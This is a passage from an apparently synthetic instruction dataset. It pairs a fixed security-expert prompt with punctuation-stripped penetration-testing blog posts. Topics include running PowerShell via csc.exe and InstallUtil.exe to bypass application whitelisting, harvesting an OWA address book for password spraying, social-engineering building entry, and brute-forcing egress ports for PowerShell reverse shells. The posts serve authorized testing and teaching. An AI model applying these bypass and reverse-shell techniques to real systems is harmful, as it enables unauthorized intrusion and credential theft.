pass in a couple of flags in order for the program to properly compile The following command can be used to compile the Program.cs file and generate an executable named powerup.exe C Windows Microsoft.NET Framework64 v2.0.50727 csc.exe r C Windows assembly GAC_MSIL System.Management.Automation 1.0.0.0__ 31bf3856ad364e35 System.Management.Automation.dll unsafe platform anycpu out C Users fmc Desktop powerup.exe C Users fmc Desktop Program.cs But...wait...what if cmd.exe is locked down No worries Open File Explorer and navigate to C Windows Microsoft.NET Framework64 v2.0.50727 Right-click on the csc.exe file and choose Create shortcut You will get a message saying that you can't create a shortcut there and it will prompt you to create one on your desktop Just click yes Now head to your desktop Right-click the csc.exe shortcut and choose Properties Click on the Shortcut tab select all of the text in the Target field and then replace it with the following text making sure to replace C Users fmc Desktop powerup.exe with a filename that will match your environment C Windows Microsoft.NET Framework64 v2.0.50727 csc.exe r C Windows assembly GAC_MSIL System.Management.Automation 1.0.0.0__ 31bf3856ad364e35 System.Management.Automation.dll unsafe platform anycpu out C Users fmc Desktop powerup.exe Then click Apply and close the Properties window What we've done here are specified parameters to pass into csc.exe when we use this shortcut to execute it The Program.cs path is purposefully left off for two reasons The main reason is that the Target field has a maximum character limit and adding in the full path to your Program.cs file will likely exceed this limit The full path to the Program.cs file will automatically be passed as an argument to the csc.exe program during the upcoming drag-and-drop step of this tutorial To compile your Program.cs file simply drag and drop the Program.cs file onto the csc.exe shortcut icon on your desktop If everything went well you should get a powerup.exe file on your desktop Congrats you just compiled a CSharp program without using the command line or Visual Studio Finally we need to run our program by using the InstallUtil.exe utility This process will be similar to how we used the csc.exe application Navigate back to C Windows Microsoft.NET Framework64 v2.0.50727 Right-click on the InstallUtil.exe file and choose Create shortcut You will get a message saying that you can't create a shortcut there and it will prompt you to create one on your desktop Just click yes Head to your Desktop right-click on the InstallUtil shortcut and click Properties Under the Shortcut tab delete everything in the Target field and replace with the following making sure to change the log file name to match your environment C Windows Microsoft.NET Framework64 v2.0.50727 InstallUtil.exe logfile C Users fmc Desktop log.txt LogToConsole false U Click Apply and then close the properties window Now head back to your Desktop if you're not already there Drag the powerup.exe file onto the InstallUtil shortcut file You should see a command prompt pop up while the script executes If you open Task Manager however you'll notice that cmd.exe isn't in the process list only InstallUtil.exe We can confirm this by running the following from a Windows command prompt right after we drag the powerup.exe file onto the InstallUtil shortcut wmic process list full Desktop save.txt From inspecting the output of the wmic command we find that InstallUtil.exe was actually called via explorer.exe and not cmd.exe Sweet Once the script finishes executing you should find the allchecks.txt file on your desktop Open the allchecks.txt file to inspect the output from the PowerUp.ps1 Invoke-AllChecks method There you have it We have a method to execute PowerShell scripts in environments that have application whitelisting enabled and have disabled access to powershell.exe and cmd.exe You can run virtually any PowerShell script that you want to with this Just a few items to note though Make sure your script doesn't use Write-Host This will cause the program to crash Use Write-Output or Out-File instead If your script prompts for user input use the -Force option when you insert the function call at the bottom of your PowerShell script There may be other characters and functions that cause issues for this method Please let me know if you run into any and we can try to get it sorted out This method can also be used to bypass AV We will give a walkthrough of that process in an upcoming video segment"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Lawrence's List 090216</title>\n<taxonomies>News, Darkweb Scanning, Dropbox, Election 2016, Election Fraud, Linux, network packet filtering support cgroups, OnionScan, Voter Fraud</taxonomies>\n<creation_date>Fri, 02 Sep 2016 17:14:19 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Lawrence Hoffmann Election fraud is something I've mentioned here recently The reality we must face here is that any time a digital system is used for voting there is the possibility of fraud via some form of hacking The risks posed by digital polling are indeed something that must be addressed and mitigated where possible The obvious consequence of a successful hack of the election systems is that a candidate wins by unfair or untrustworthy means Consequences run deeper though a rigged election whether or not the winning candidate had anything to do with the rigging would undermine trust in the democratic process at a time when the government can least afford to look any more shady than it has these past few years Andrew Appel has posted a series of mitigations that could be considered on the Freedom to Tinker blog Part one discusses how officials might audit the elections to at least detect if hacking were happening Part two discusses the US government's take on cybersecurity and addresses how the no one but us concept can only hurt us reedom-to-tinker.com blog appel security-against-election-hacking-part-1-software-independence reedom-to-tinker.com blog appel security-against-election-hacking-part-2-cyberoffense-is-not-the-best-cyberdefense It turns out that the rumors of a Dropbox hack are true Just north of 68 million records have been obtained from Dropbox it appears in 2012 These records contained usernames and hashes the hashes come in two varieties with some of the users having bcrypt hashes in the leak and others having SHA1 Thankfully the SHA1 hashes do not include their salts as that would have made cracking the hashes much less difficult The bcrypt hashes do have their salts included in the leak Linked is an independent verification of the leak ww.troyhunt.com the-dropbox-hack-is-real A while back I put a couple of articles on here that discussed darkweb scanning with OnionScan It was a series we've seen parts one and two and have been promised a rundown of how the graphs were made in those postings Part three is up ww.automatingosint.com blog 2016 08 dark-web-osint-with-python-part-three-visualization It looks like we may soon see network packet filtering support for cgroups For those not in the know Control groups cgroups are a kernel feature that allow processes to be grouped and resources to be controlled for that group think Docker Some members of the Linux kernel development team are currently discussing possible solutions that would allow use of the Berkley packet filter or netfilter to control network traffic for a particular group This would mean that filters could be applied to ingress or egress traffic of a particular limiting what kinds of traffic that group could generate or receive This has some nice security implications and could make a nice addition to Docker's current capabilities wn.net Articles 697462 wn.net Articles 698080"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How Does Let's Encrypt Gain Your Browser's Trust?</title>\n<taxonomies>Author, Ethan Robish, How-To, encryption, Let's Encrypt, SSL/TLS certificate</taxonomies>\n<creation_date>Tue, 06 Sep 2016 14:23:39 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Ethan Robish Let's Encrypt is a free service that allows you to obtain a free as in beer SSL TLS domain validation certificate to use as you wish Here is what they have to say about themselves Let's Encrypt is a free automated and open certificate authority CA run for the public's benefit Let's Encrypt is a service provided by the Internet Security Research Group ISRG The key principles behind Let's Encrypt are Free Anyone who owns a domain name can use Let's Encrypt to obtain a trusted certificate at zero cost Automatic Software running on a web server can interact with Let's Encrypt to painlessly obtain a certificate securely configure it for use and automatically take care of renewal Secure Let's Encrypt will serve as a platform for advancing TLS security best practices both on the CA side and by helping site operators properly secure their servers Transparent All certificates issued or revoked will be publicly recorded and available for anyone to inspect Open The automatic issuance and renewal protocol will be published as an open standard that others can adopt Cooperative Much like the underlying Internet protocols themselves Let's Encrypt is a joint effort to benefit the community beyond the control of any one organization You might be wondering how such a service can exist On the technical side the answer is fairly straightforward Let's look at why your browser automatically trusts certificates issued by this provider Inspecting a certificate obtained from Let's Encrypt shows that it was issued by Let's Encrypt Authority X3 which is in turn signed by DST Root CA X3 Certificate Issuer Details Certificate Chain Next I opened up the list of my system's certificates I run Mac OS X but you can find a similar list on your operating system as well I searched for the certificate authority CA I found earlier DST Root CA X3 and it came right up Mystery solved Let's Encrypt has been issued an intermediate certificate that is signed by a root CA certificate that comes bundled with your operating system More on that below One side note is that while Internet Explorer Safari and Google Chrome all use the host operating system's certificate store Mozilla Firefox comes bundled with it's own DST Root CA X3 is listed there but it is interesting to see that Let's Encrypt's certificates are listed directly there as well Let's Encrypt Certificate Authority in Firefox To confirm our bit of sleuthing this Let's Encrypt blog post details how it obtained its first certificates It essentially echoes what we've just uncovered The post also had a nice diagram showing the signing relationships There are a couple more moving parts in the diagram because Let's Encrypt actually first generated a key pair for its parent organization the Internet Security Research Group ISRG which is shown as well Image Credit etsencrypt.org 2015 06 04 isrg-ca-certs.html One question remains however since the post only mentions Let's Encrypt Authority X1 X2 But my earlier screenshots show a Let's Encrypt Authority X3 What's going on This forum post answers that question In an effort to gain better backwards compatibility Let's Encrypt had two new certificates issued named Let's Encrypt Authority X3 X4 IdenTrust in the form of the DST Root CA X3 certificate we found earlier is already a trusted CA in your system's certificate store By having IdenTrust sign Let's Encrypt's intermediate certificates it allowed Let's Encrypt to bypass what it claims is a 3-6 year process of getting their own root CA into operating systems certificate stores Remember how I said that Firefox has it's own self-contained certificate store Turns out it's much quicker to get a certificate added there because Let's Encrypt has announced that the ISRG Root X1 key shown in the diagram above will be included starting with Firefox 50 There are already instructions on implementing Let's Encrypt for many operating systems and web servers here along with countless other articles that you can use Google to find However if there's enough interest I may do a follow-up post where I walk through my own non-trivial setup I created a workflow that allows integrating Let's Encrypt into a pre-existing Nginx configuration with zero downtime In addition it lets me quickly secure a new sub-domain at any time using Let's Encrypt If you're interested in this type of setup let me know on Twitter at EthanRobish"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Honeyports & ADHD!!!</title>\n<taxonomies>Author, Blue Team, Blue Team Tools, John Strand, ADHD, honeyports</taxonomies>\n<creation_date>Wed, 07 Sep 2016 15:30:33 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "John Strand Lets take a look at how to use HoneyPorts on the new Active Defense Harbinger Distribution embed ww.youtube.com watch?v 0YZjNdbTnoc embed For those of you who do not know this is a really cool script which dynamically blocks an IP address which makes a full established TCP connection This is cool because it makes spoofing very hard to do"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Let's Get Physical* Part 1; Defeating Wetware Access Controls</title>\n<taxonomies>Physical, Red Team, breech, defeating access controls, getting in, insiders, olivia newton john, physical pen test, physical pen testing</taxonomies>\n<creation_date>Thu, 08 Sep 2016 16:00:59 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Sally Vandeven I found myself with a little extra time one day and I didn't tell my project manager so I thought it would be a great time to write a blog post I asked two friends colleagues if there were any topics they would like to see covered and interestingly they both independently responded with the same topic They wanted to read about some of the physical pen tests that we do Excellent idea It is interesting intriguing and mostly fun more on that later so here you go Organizations hire us to test the security of their networks When you take a 30 000-foot view of computer security in general it basically boils down to access control It is all about keeping bad stuff out of the organization and preventing the good stuff from leaving the organization Of course it is 2016 and in security we all have come to accept the premise that bad stuff WILL happen so we should focus on detection as well as prevention Security engineers auditors and pentesters all have the same goal to improve an organization's security posture But as pentesters it is our job to demonstrate risk in a controlled manner Instead of telling an organization what could happen if they don't patch their systems or look at their logs we show them what can happen This can be very eye opening to skeptical managers that are hesitant to allocate budget for security projects I have found this to be especially true when it comes to demonstrating physical access attacks Let me explain with an example A colleague and I were doing a physical penetration test for an organization We were tasked with entering the building using social engineering only In this case no lock picking and no badge cloning The building had RFID access badge entry on all exterior doors as well as many interior doors At every locked door was a sign that read No Tailgating There was a front door that remained open during business hours but a guard receptionist was stationed immediately inside with full view of the door There was a sign-in sheet at the reception desk with a sign that read Visitors Must Sign In Video cameras were trained on all ingress doors and the guard receptionist at the front entrance had a bank of monitors with the video feeds Inside the building employees were required to use an access badge to operate the elevator There were of course stairwells but they were locked from the stairwell side and required an access badge to open from the stairwell Only the exterior door on the ground floor of the stairwell could be opened from inside without any access control This of course was a safety measure to ensure that all people inside the building could easily get out in case of an emergency In other words if you found yourself in a stairwell without the proper access card the only place you could go was outside Also all employees worked in cube farms or open office areas each of which was behind a locked door with access controls enforced by the RFID badges To some this sounds like bulletproof security But to the bad guy or the scheming pentester it sounds like an easy mark Why Because as pentesters we learn that it is easy to defeat access controls if you look and act like an insider like you belong there Look Like an Insider Any good physical assessment should begin with some reconnoitering colloquially referred to as casing the joint We rent an inconspicuous car and drive to the target site looking for clues as to how we will go about appearing like we belong If employees are wearing suits we wear suits If employees are dressed casually we dress casually If employees are wearing or carrying a badge we create and wear a similar badge etc Whatever it takes to blend in For this particular assessment we observed that employees had access badges and most were attached to a particular color lanyard There was an outdoor picnic table near an employee entrance so we sat at the table and got close enough views of people entering and exiting the building with their badges that we were able to recreate one with surprising accuracy These were simply look-alikes not RFID clones so the only function they would serve was to help us look like legitimate employees You might wonder if the staff we were observing found it suspicious that unfamiliar people were sitting at their outdoor lunch spot and you would be correct to wonder that The answer is I imagine some do but in our experience rarely if ever do they approach us or report us We also observed that employees were letting others tailgate in despite the signs on the door forbidding such actions Act Like an Insider Once we got the lay of the land and had created or purchased all the props that we needed we made our move to enter the building With physical testing involving social engineering unlike a remote network assessment each person gets one chance if you get caught you are done Because of this we usually enter one at a time and stay separated inside the building On this particular occasion I entered first by tailgating in with other employees They were happy to hold the door for me Why Because people are generally considerate of one another and want to be helpful and we take advantage of that I know that sounds very cold and cruel but since that is how criminals operate and we are trying to demonstrate risk we do it too So here is how it works if you set up the situation such that anyone who does NOT hold the door for you appears rude then you will get in This particular attempt happened like this The look-alike badge was hanging around my neck I was carrying some books and papers in one arm and also holding my morning cup-o-joe My phone was at my ear as if I was talking to someone I smiled and made eye contact with the people approaching the door I had watched them from the parking lot and carefully timed my approach accordingly The door was graciously held open for me as I entered the building Why did they let a stranger in When someone is on the phone others are hesitant to interrupt People are conditioned to hold the door for others especially older people and women In my case I am an older woman never thought that would be an advantage in this business right I looked like I might work in the building and I appeared happy and confident that I was in the right place so anyone who refused to help me at that point would have created a messy situation and probably felt like a jerk in the process By the way this is one of the things about physical testing that most of us really don't like taking advantage of someone else's good intentions Be an Insider What happens next once you find yourself inside the building I find this the trickiest couple of minutes on the assessment because in most cases you don't know the layout of the building unless you have been lucky enough to find a floor plan ahead of time If the people who let you in the building had any suspicion at all they will certainly be more likely to take some action if at this point you look like you don't know where you are going What I have found most successful is to enter boldly and plow ahead looking hurried like I am going to be late for a meeting Once I find myself in a location that is quiet I stop and take stock of the situation thus far For example I look for a quiet corridor a conference room a restroom or even at a seat at a bank of unoccupied cubes This is also when I contact my colleague via SMS and start a photo timeline A photo timeline is created by just snapping photos with the phone at regular intervals The timeline can prove very helpful later during the assessment as well as later while writing up the report Basically the photo timeline helps me recreate my path in the building provides timestamps for the customer they can check against access logs and may be the breadcrumb trail that is needed to get back out undetected When we first entered this particular building we had no idea that we would end up inside for several hours During this test I found an exterior unalarmed door near the back of the building with little activity There was a video camera trained on the door but we were working under the assumption that the guard would probably not be watching and that turned out to be the case Via SMS I communicated with my colleague to guide him to the door and opened it from the inside allowing him to enter He could have tailgated in as well but it provides more value to the customer if we can demonstrate different methods of entry Now that we were both inside we parted ways in order to cover more ground during our search for the flag The flag we were tasked to find by our point of contact PoC was the data center and we were asked to attempt entry take pictures as proof and then leave tampering with hardware was not in scope Since most areas required card access for entry we had to tailgate in everywhere including the elevator We learned this the hard way After thoroughly searching one floor of the building and comparing notes with my colleague we decided it was time to move to another floor I found an elevator and called it to my floor When the doors opened it was empty and there was no one else waiting to ride the elevator I was alone I entered the elevator and checked out the control panel there was an RFID access pad Hmmm On the off chance that I would not need to swipe I pushed a button for another floor Nothing The light on the RFID pad was red Not a good sign I tried another button Nothing In the meantime the doors to the elevator closed and I was inside It instantly became stuffy inside so I pushed the button for the floor I was on Surely that would be allowed Nothing I was stuck inside and could not move I texted my colleague and to my surprise I had enough signal and my text went through He found his way to what we hoped would be the same elevator on another floor and pushed the button to summon the elevator When the doors opened it was empty another car had been summoned instead I ended up stuck inside the elevator for about 10 minutes but it seemed like 2 hours Ultimately because of others using the elevator my car eventually was called into service and when the doors opened I remained inside and tried to stay calm The person entering the lift looked at me and I smiled They swiped their badge and pushed floor 3 exactly the floor I was hoping for and I was able to hitchhike to the next floor without proper authorization If the person that had entered the elevator to go to the third floor noticed that none of the LEDs for any of the floors were illuminated meaning I had not swiped and requested a particular floor they didn't say anything to me and allowed me to ride along Again people tend to avoid conflict and don't generally like to be rude so we use this to our advantage We spent hours inside the building but did not find the datacenter our flag It was unmarked and apparently well hidden Frustrated we found a cafeteria and sat down together to make a new plan Surely the datacenter was behind one of the many unmarked locked doors that we had encountered that morning but which one Lock picking and badge cloning were out of scope for this particular assessment We asked ourselves what access control is left to defeat The answer of course is the human wetware So we decided to ask for help We approached a kind looking receptionist not the one at the front door because she was trained to be suspicious and spot unauthorized activity We found a suite of offices on the floor that we were guessing might be the right floor again more hitchhiking to get back there and entered the suite The receptionist asked if she could help us and we said Yes you can We are looking for the datacenter because we are supposed to meet someone there but we cannot find it Can you point us in the right direction Unlike the guard at the front door this person is trained to be helpful and courteous and she dutifully answered our question Bingo Before we knew it we were standing in front of the datacenter The receptionist noticed that the person we were supposed to meet was not there and asked us if she should call him We said no that we would wait for him and thanked her for her help She left Now we just had to find a way in My colleague and I had decided that it was boom or bust We could both hear John's voice in our heads Push it right to the edge If you don't get caught you didn't try hard enough So we knew that we were not leaving until either 1 we got in or 2 we got caught You see getting caught provides valuable information to the customer as well We defeat as many controls as we can to show where the weaknesses are but we keep going until we get caught to show where the strengths are Ultimately after several attempts to convince someone to open the datacenter door and allow us access someone alerted security and we were promptly asked to leave By the way we had a Get-Out-of-Jail-Free card a letter signed by an executive stating that we were authorized to be there and it included phone numbers that the guard could call to verify Interestingly in that particular case we were just asked to leave the building We did Mission accomplished Recap of the access controls defeated There are multiple entrances to the building through which employees can come and go but none use turnstiles to ensure that people enter one at a time Let's face it The amusement parks got this one right because every hot body that enters the park better have a valid ticket it's their bread and butter It's much more difficult to get away with jumping a turnstile than casually entering through a door held open by someone else There is only one entrance with an enforcing control the front door with the guard A single guard cannot watch the front door check badges get visitors to sign-in and watch all the monitors all the time The elevators cannot detect how many people step into the car at one time to put the elevator in motion requires only one badge swipe People are generally considerate of one another and want to be helpful Coming up next Let's Get Physical Part 2 Defeating Hardware Access Controls Stay tuned _______ Want to have a little soundtrack while you read this Olivia Newton John's Physical is the obvious choice embed outu.be vWz9VN40nCA embed"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Downloading an Address Book from an Outlook Web App (OWA) Portal</title>\n<taxonomies>External/Internal, Red Team, Burp, Duct Tape, Mechanical Engineering, password spraying, pen-testing</taxonomies>\n<creation_date>Wed, 14 Sep 2016 15:46:39 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Carrie Roberts Update 10 03 16 Want to download the address book automatically with PowerShell Check out Beau Bullocks latest additions to MailSniper As part of a penetration test you've gained access to an employee's web mail perhaps through a password spraying attack Outlook Web App Login Your original password spray was done with a limited username list based on what you could find through reconnaissance Now you would like to repeat the password spray with the full username list but you don't see a way to download the address book from the OWA interface Uggghhh do I need to write some custom web scraping code No Wait Burp Suite Pro to the rescue Burp Suite will automatically pull email addresses out of responses and include them in an Email addresses disclosed issue report All we need to do is proxy our web traffic through Burp as we browse the OWA address book In the example above 3 135 email addresses were extracted as I browsed the address book via OWA I simply started a new email and selected the To link to bring up the address book I noticed that only a limited amount of results were returned but if I used the scrollbar to scroll the address list from top to bottom it would force all the addresses to load As they were loaded Burp successfully extracted them leaving me with the entire address book that I could copy and paste into other tools Note that Burp is configured by default to do live passive scanning which reports on disclosed email addresses If for some reason you have disabled that feature you can re-enable it on the Scanner Live Scanning tab as shown below Update I just used this technique on an address book that had over 16 thousand entries and I got tired of holding the mouse button down to scroll through the whole list The Mechanical Engineer in me shined through with this solution Go Duct Tape For related posts see the following Exploiting Password Reuse on Personal Accounts How to Gain Access to Domain Credentials Without Being on a Target's Network Part 1 Password Spraying Outlook Web Access How to Gain Access to Domain Credentials Without Being on a Target's Network Part 2 Question What Can I Learn from Password Spraying a 2FA Microsoft Web App Portal Answer Enough to make it worth it"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Mining Mary's Social Media Antics for Social Engineering</title>\n<taxonomies>InfoSec 201, fun with social networks, kony2012, social engineering, social media mining</taxonomies>\n<creation_date>Fri, 16 Sep 2016 15:15:23 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Christine Sorensen Let's talk about Mary Mary Watson is a girl in her twenties and just graduated from Midtown University with her bachelors in Fashion Merchandising Mary is now looking for her very first big girl job Everyone warns her about her reckless Facebook activity and how that might ruin her chances at a new job in the fashion industry She recalls party photos she is tagged in The Lonely Island YouTube videos she shared and controversial topics about what color the dress was and Kony 2012 she posted She is now worried Mary is smart though She sets her Facebook privacy from Public to Friends so that only her connections can view her profile She also changes her name on Facebook from Mary Watson to Mary Jane thinking she is so clever by using her middle name instead of her last name Future employers can't find my Facebook now she says to herself Mary successfully lands a job at Marvel Fashions Two years later the newly married Mary Parker is still at Marvel Fashions The company decides to hire Black Hills Information Security for their services BHIS's intern Harold Osborn Harry for short is assigned to this project Harry calls Marvel Fashions's IT department with a girly voice and impersonates Mary The people at IT answer Marvel Fashions Flash Thompson speaking Hi Harry's voice goes up an octave I'm Mary Parker and I forgot my password to the system Silly me I'm sorry Ms Parker but I can't just give that to you I'm going to need some information from you before I can do that Of course What kind of information do you need Flash Harry flirts Your birthday and your mother's maiden name Harry hangs up the phone It's time to do some searching The easiest stop Facebook Harry searches the name Mary Parker However no profiles are returned Harry redirects to LinkedIn He accesses Marvel Fashions profile finds the list of employees and searches for Mary Parker The profile appears with a photo of a woman with rich brown hair and dark hazel eyes He now has a face for the name Harry moves back to Facebook and again searches the name Mary Parker again Still no results He resorts to Google and searches her name there The second link returned is to the website The Knot with a wedding page for the marriage of Peter Benjamin Parker and Mary Jane Watson from a year ago Perfect Harry thinks to himself He returns to Facebook and now searches for Mary Jane The first profile that appears is the rich brown-headed Mary he's looking for However Mary was smart all those years ago and there isn't much available to see on her profile Harry is frustrated as he clicks through her photos He stops on one picture with a comment from Madeline Garfield Watson My daughter is GORGEOUS!!!1 Madeline Garfield Watson must be Mary's mother Her mother's maiden name is Garfield Harry is excited but he still needs the date of birth Harry returns to Google and searches for Mary Jane Watson again The first link is to Mary's old Twitter account maryjane2009 Harry scrolls through years of tweets cringing at each hashtag Finally he stops at a post from 2012 That's her 21st birthday Her date of birth is June 19 1991 Harry calls Marvel Fashions's IT department in the girlish voice again and provides them with the new information Harry gets Mary's password Mary wasn't as smart as she thought she was Mary's story is fiction and there's no one named Harry at BHIS or is there but like the best kind of fiction it's not hypothetical This kind of social engineering and research happens during actual phishing attempts You can avoid being the target of this kind of predicament Start by restricting what you put on social media networks always being aware that once it's online it's online forever You can mitigate the risk by also deleting accounts and sites you no longer use Harry managed to find Mary's middle name through The Knot Mary's wedding had happened over two years ago when Harry found it Mary also had a Twitter account that was public where she carelessly threw around personal details Had she changed the setting of her account from Public to Protected Harry wouldn't have been able to find her birthday As for her mother's maiden name that was something out of Mary's reach unless she deleted her entire Facebook account or unfriended her mom which her mom might not have been too happy about There is a risk with using social media for most of us the reward of keeping up with distant friends and family far outweighs the risk but it's important to realize that risk still exists Mitigate it by staying mindful limiting access and keeping very personal details off-line It makes our job here at BHIS a lot more difficult and that makes us happy _____ Ironically not ironically the Twitter account maryjane2009 is a real dead account full of information we gleaned that her birthday is on the 13th she's Italian and isn't from the US and she's older than 25 Ahhh"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Adding Egress Brute Force to PowerShell Payloads</title>\n<taxonomies>External/Internal, Red Team, Brute Forcing, Listeners, PowerShell, SET</taxonomies>\n<creation_date>Mon, 19 Sep 2016 19:07:07 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Guest post by Robert Schwass We've all been there You craft the perfect phishing email register a great domain name your multi handler is set up ever so perfectly And then you wait and nothing happens Egress packet filtering has destroyed all your hard work Now there are payloads and listeners designed specifically for this sort of thing and they usually work well But if you're like me you want to have options PowerShell has been my bread and butter as of late so I decided to write a few lines of script that would allow me to try every port out towards my listener until I found an open one and then use that port in my payload Be sure to set your own host address for your listener also note the wait variable has 2000 set as the timeout you can increase this number to ensure you have enough time between client and server but then it takes longer to get through all the ports so tweak as needed On the server side I wanted to have just as many options No matter the listener metasploit multi handler or any of the various cats nc ncat PowerCat gcat dnscat etc I wanted a solution that could handle my reverse shells coming in on any port IPtables to the rescue This little one liner forwards all ports 65k and change to one of my choosing 4444 in this case After setting the IPtables fire up the metasploit reverse tcp listener.Remember to use the port you specified in the iptables command 4444 Throw the first bit of code in front of your favorite PowerShell reverse tcp payload I generated mine with the Social Engineering Toolkit SET I simply had to modify the code to use the IP address I set in the Egress loop address Computername and comment out the line below that that is setting the port as I already set the variable named port in my Egress loop Watching the PowerShell in action it fires the shell when it hits port 25 as this is the first open port to the listener That Is Nothing New I am aware that Metasploit has an multi shell reverse_tcp_allports payload to listen on all ports But like I said we want flexibility We aren't always going to be in a situation where we can use a fancy pants Metasploit reverse tcp listener Maybe you got root access to an old unused development web server on the DMZ and you want to use that as the landing place for your payloads There are often constraints in place that can get in the way of installing all the tools of the trade Perhaps you popped a box that has ncat already running on it because the user installed it with Nmap Whatever your reason for not having the multi shell reverse_tcp_allports payload this technique may be able to help The Same Concept with a Powercat Payload I got Powercat up and rolling so I generate a payload This spits out a ton of code but at the bottom there is the execution of the main function.This looks like as good of a place as any to stick some variables So I throw my loop in there right above the call to the Main function so it executes before everything else And I change the IP address and port number in the function call to their respective variables from my loop Powercat Payload didn't like PS ISE so I used Notepad I save this script as payload.ps1 and start my PERSISTENT netcat listener Again I use port 4444 We must be persistent as the payload hits the port twice and will kill the listener Then I execute payload.ps1 Once it hits port 25 first open port Success Conclusion So there you have it A few lines of PowerShell and some iptables and you have a way to potentially brute force your way out of some networks that are attempting to block egress traffic If you are going to take the time to get code on a system why not add a few more lines to increase your chances of getting that shell out Even if you are in a situation where you can use theallports flavors of Metasploit Multi Handler listeners adding a simple loop to your PowerShell payload can greatly increase the odds of success Research Limitations I tested this against iptables using both REJECT and DROP on the packets and it worked You may or may not experience different results behind enterprise firewalls There are other ways to test for open ports with PowerShell During my research the method I used allowed me to make full connections with a timeout which seemed to work the best ______ We love guest posts Want to write for us Use our contact form to let us know your title and brief summary of your idea"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Turning a Raspberry Pi 3 Into a Cloaking Device With goSecure VPN</title>\n<taxonomies>Author, How-To, Jordan Drysdale, cloaking, goSecure, great success, IADGov, magical time, non-attrib, raspberry Pi, VPN</taxonomies>\n<creation_date>Wed, 21 Sep 2016 17:39:44 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
